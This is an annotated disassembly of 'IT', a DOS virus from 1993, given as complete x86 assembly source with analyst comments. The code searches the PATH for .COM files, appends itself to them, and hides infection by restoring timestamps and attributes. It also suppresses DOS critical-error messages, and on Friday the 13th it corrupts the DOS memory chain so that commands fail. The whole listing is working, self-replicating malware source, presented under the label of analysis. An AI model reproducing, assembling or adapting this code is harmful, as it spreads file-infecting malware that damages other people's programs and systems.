;*************************************************************************
;*                                                                       *
;*                                 IT.ASM                                *
;*      ORIGIN: MEXICO                                                   *
;*      SIZE:457                                                         *
;*      DISASSEMBLY & ANALYSIS BY: Kohntark                              *
;*      Created:   24-Apr-93                                             *
;*                                                                       *
;*************************************************************************


MAIN            SEGMENT
                ASSUME  cs:main, ds:main
                ORG  100h

HOST:
                jmp     VIRUS                   ; (0147)
                add     bx,22h                  ;Do nothing host
                add     cx,23h
                add     dx,2Dh
                add     si,17h
                add     di,22h
                nop
                nop
                nop
                nop
                nop
                add     ax,22h
                add     bx,22h
                add     cx,23h
                add     dx,2Dh
                add     si,17h
                add     di,22h
                nop
                nop
                nop
                nop
                nop
                add     ax,22h
                add     bx,22h
                add     cx,23h
                add     dx,2Dh
                add     si,17h
                add     di,22h
                nop
                nop
                nop
                nop
                nop
                int     20h                     ;Host Program Terminate

;*****************************************************************************
; virus starts here
;*****************************************************************************

VIRUS:
                push    ax                      ;save ax, unnecessary
                call    GET_POE

GET_POE:                                        ;get point of entry
                pop     bp
                sub     bp,304d                 ;pad index

;****************************************
; restore host
;****************************************

                lea     si,[bp+753d]            ;HOST_STUB
                mov     di,100h                 ;address to restore to
                mov     cx,3                    ;restore 3 bytes
                cld                             ;Clear direction flag
                rep     movsb                   ;restore from si to di 3 bytes

;****************************************
; get DTA's address
;****************************************

                push    es                      ;save es
                mov     ah,2Fh                  ;ah=function 2Fh
                int     21h                     ;get DTA address into es:dx

;****************************************
; save DTA address into v-code
;****************************************

                mov     ss:763d[bp],bx        ;(600D:02FB=3032h) =  763
                mov     ss:765d[bp],es        ;(600D:02FD=3032h) =  765

;****************************************
; redirect the DTA into v-code
;****************************************

                mov     ah,1Ah                  ;ah=function 1Ah
                lea     dx,[bp+767d]            ;Load effective addr
                int     21h                     ;set DTA to ds:dx  (HEAP)

;****************************************
; hook int 24h Critical Error Handler
;****************************************

                mov     ax,2524h                ;ah=function 25h
                lea     dx,[bp+710d]            ;Load effective addr
                int     21h                     ;set intrpt vector al to ds:dx

;****************************************
; scan for 'PATH=' in environment
;****************************************

                mov     es,ds:44d               ;es:di => environment segment
                xor     di,di                   ;Zero register
FIND_PATH:
                lea     si,[bp+742d]            ;Load effective addr (438)
                lodsb                           ;String [si] to al
                mov     cx,8000h                ;scan the whole segment
                repne   scasb                   ;Rept zf=0+cx>0 Scan es:[di] for al

                mov     cx,4

;***************************************
; Loop to check for the next 4
; characters
;***************************************

CHECK_NEXT_4:
                lodsb                           ;String [si] to al
                scasb                           ;Scan es:[di] for al
                jnz     FIND_PATH               ;If not all there start all over
                loop    CHECK_NEXT_4            ;loop to check next character

                pop     es
                mov     ss:759d[bp],di          ;save the address of the path
                lea     di,[bp+32Ah]            ;Filename workspace
                jmp     short SLASH_OK          ; (01D2)

;******************************************
; Look in the path for more subdirectories
;******************************************

SET_SUBDIR:
                cmp     BYTE PTR ss:759d[bp],00          ;(600D:02F7=3856h)
                jne     FOUND_SUBDIR            ; Jump if not equal
                jmp     RESET_DTA               ; (029E)

FOUND_SUBDIR:
                push    ds
                mov     ds,ds:44d               ;ENVIRONMENT
                mov     si,ss:759d[bp]          ;(600D:02F7=3856h)
                lea     di,[bp+32Ah]            ;di points to filename workspace

MOVE_SUBDIR:
                lodsb                           ;String [si] to al, get char
                cmp     al,3Bh                  ;';' path delimiter
                je      MOVED_ONE               ;found another dir
                or      al,al                   ;Zero ?
                jz      MOVED_LAST_ONE          ;Jump if zero
                stosb                           ;store al to es:[di]
                jmp     short MOVE_SUBDIR       ;(01B6)

MOVED_LAST_ONE:
                xor     si,si                   ;Zero register

MOVED_ONE:
                pop     ds
                mov     ss:759d[bp],si          ;(600D:02F7=3856h)
                cmp     byte ptr [di-1],5Ch     ; '\'
                je      SLASH_OK                ; Jump if equal
                mov     al,5Ch                  ; '\'
                stosb                           ; Store al to es:[di]
SLASH_OK:
                mov     ss:761d[bp],di          ;restore filename pointer to name workspace
                lea     si,[bp+2EBh]            ;restore si
                mov     cx,6                    ;# of bytes to move point to *.COM
                rep     movsb                   ;Rep while cx>0 Mov [si] to es:[di]
                                                ;move *.com to workspace
;************************************
; FIND files to infect
;************************************

                mov     ah,4Eh                  ;ah=function 4Eh
                mov     cx,3                    ;attributes read only or hidden OK
                lea     dx,[bp+32Ah]            ;Load effective addr
                int     21h                     ;find 1st filenam match @ds:dx

                jmp     short FIND_FIRST
FIND_NEXT:
                mov     ah,4Fh                  ;ah=function 4Fh
                int     21h                     ;find next filename match

FIND_FIRST:
                jnc     FOUND_FILE              ; Jump if carry=0
                jmp     short SET_SUBDIR

FOUND_FILE:
                mov     al,ss:315h[bp]          ;get time from DTA
                and     al,1Eh                  ;mask off all but seconds
                cmp     al,1Eh                  ;seconds = 60?
                je      FIND_NEXT               ;possibly infected get next file

                cmp     word ptr ss:319h[bp],0FBC2h     ;is file too long?
                ja      FIND_NEXT                       ;if so get next file

                lea     si,[bp+31Dh]            ;di => filename
                mov     di,ss:761d[bp]          ;si => filename in DTA
MORE_CHARS:
                lodsb                           ;move string to the end of path
                stosb                           ;Store al to es:[di]
                or      al,al                   ;Zero ? move until we find a 00
                jnz     MORE_CHARS              ;Jump if not zero

;**********************************
; Get file's attributes from DTA
;**********************************

                mov     ax,4301h                ;ah=function 43h
                xor     cx,cx                   ;cx = 0
                lea     dx,[bp+32Ah]            ;dx => path/filename
                int     21h                     ;get/set file attrb, nam@ds:dx

;************************************
; Open file for I/O
;************************************

                mov     ax,3D02h                ;ah=function 3Dh
                lea     dx,[bp+32Ah]            ;Load effective addr,name of file
                int     21h                     ;open file, al=mode,name@ds:dx

                jc      RESET_ATTR              ;Jump if carry Set
                mov     bx,ax                   ;put file handle in bx

;*****************************************
; Read file's 1st 3 bytes
;*****************************************

                mov     ah,3Fh                  ;ah=function 3Fh
                mov     cx,3                    ;# of bytes to read
                lea     dx,[bp+2F1h]            ;put 3 bytes here
                int     21h                     ;read file, cx=bytes, to ds:dx

                jc      RESET_DATE              ;problem? set iD and exit
                cmp     ax,3
                jne     RESET_DATE              ;problem? set iD and exit

;**************************************
; move file pointer to EOF
;**************************************

                mov     ax,4202h
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                jc      RESET_DATE              ;problem? set iD and exit

;*****************************************
; calculate host's jump to virus address
;*****************************************

                sub     ax,3
                mov     word ptr ss:757d[bp],ax  ; (600D:02F5=5449h)

;***************************************
; Write virus to EOF
;***************************************

                mov     ah,40h                  ;ah=function 40h'
                mov     cx,1C9h                 ;write 457 bytes
                lea     dx,[bp+12Ch]            ;Load effective addr
                int     21h                     ;write file cx=bytes, to ds:dx


                jc      RESET_DATE              ;problem? set iD and exit
                cmp     ax,1C9h                 ;wrote 457 bytes?
                jne     RESET_DATE              ;if not reset date & exit

;***************************************
; move file ptr to beginning of File
;***************************************

                mov     ax,4200h                ;ah=function 42h
                xor     cx,cx                   ;Zero register
                xor     dx,dx                   ;Zero register
                int     21h                     ;move file ptr, cx,dx=offset

                jc      RESET_DATE              ;problem? set iD and exit

;****************************************
; write jmp code to virus at the
; beginning of the new host
;****************************************

                mov     ah,40h                  ;ah=function 40h
                mov     cx,3                    ;write 3 bytes
                lea     dx,[bp+2F4h]            ;3 bytes here
                int     21h                     ;write file cx=bytes, from ds:dx

;***************************************
; reset file's date and time and fix ID
;***************************************

RESET_DATE:
                mov     ax,5701h                ;ah=function 57h
                mov     cx,ss:315h[bp]          ;(600D:0315=0)
                mov     dx,ss:317h[bp]          ;(600D:0317=0)
                and     cx,0FFE0h               ;fix ID (time)
                or      cl,1Eh                  ;set seconds to 60 (30 * 2)
                int     21h                     ;set file date & time

;*********************************
; Close file handle
;*********************************

                mov     ah,3Eh                  ;ah=function 3Eh
                int     21h                     ;close file, bx=file handle

;*********************************
; Restore file attrs
;*********************************

RESET_ATTR:
                mov     ax,4301h                ;ah=function 43h
                xor     cx,cx                   ;Zero register
                mov     cl,ss:314h[bp]          ;(600D:0314=0) previous file attrs here
                lea     dx,[bp+32Ah]            ;file name here
                int     21h                     ;set file attrb, nam@ds:dx

;****************************************
; reset DTA
;****************************************

RESET_DTA:
                push    ds                         ;save current data segment
                mov     ah,1Ah                     ;ah=function 1Ah
                lds     dx,dword ptr ss:763d[bp]   ;(600D:02FB=3032h) Load 32 bit ptr
                int     21h                        ;set DTA to ds:dx

;******************************************
; Restore int 24h, critical error handler
;******************************************

                lds     dx,dword ptr es:12h     ;(600D:0012=0) Load 32 bit ptr
                mov     ax,2524h                ;ah=function 25h
                int     21h                     ;set intrpt vector al to ds:dx
                pop     ds                      ;restore current data segment

;*************************************
; Find out if current date is
; the friday the 13th
;*************************************

                mov     ah,2Ah                  ;ah=function 2Ah
                int     21h                     ;get date, cx=year, dx=mon/day

                cmp     dl,0Dh                  ;compare day to 13
                jne     EXIT                    ;not the 13th?

                cmp     al,5                    ;friday?
                jne     EXIT                    ;not friday? exit.

;*************************************
; Kill Dos memory size
; Every command run will give a
; OUT OF MEMORY message
;*************************************

                push    es                      ;save es
                mov     ah,52h                  ;ah=function 52h
                int     21h                     ;get DOS ' list of lists

                mov     es,es:[bx-2]            ;segment of 1st memory block
                mov     byte ptr es:[0000],00   ;kill memory size
                pop     es                      ;restore es
EXIT:
                pop     ax                      ;restore ax saved at beginning of code
                xor     bx,bx                   ;Zero register
                xor     cx,cx                   ;Zero register
                xor     dx,dx                   ;Zero register
                xor     si,si                   ;Zero register
                xor     di,di                   ;Zero register
                mov     bp,100h                 ;set return address
                push    bp                      ;push return address in stack
                xor     bp,bp                   ;Zero register
                retn                            ;return to host

;*******************************************************************************

;***********************************
; INT 24H CRITICAL ERROR HANDLER
;***********************************

int_24h_entry:

                add     sp,6                   ;move stack pointer
                pop     ax                     ;restore all registers
                pop     bx
                pop     cx
                pop     dx
                pop     si
                pop     di
                pop     bp
                pop     ds
                pop     es
                stc                             ;Set carry flag
                retf    2                       ;Return far

int_24h_entry_end:

;******************************************************************************

copyright       db      '(C) ITV85020203'
                db      0
                db      'PATH=*.COM',0
HOST_STUB       db      05, 22h, 00             ;add ax,34d = 052200
NEW_JUMP        db      0E9h                    ;new host's jmp code to virus
                                                ;goes here

;**************************************************
; The DTA gets redirected to the heap after file.
; Also the working space goes in the heap
;**************************************************

MAIN            ENDS
                END     HOST
                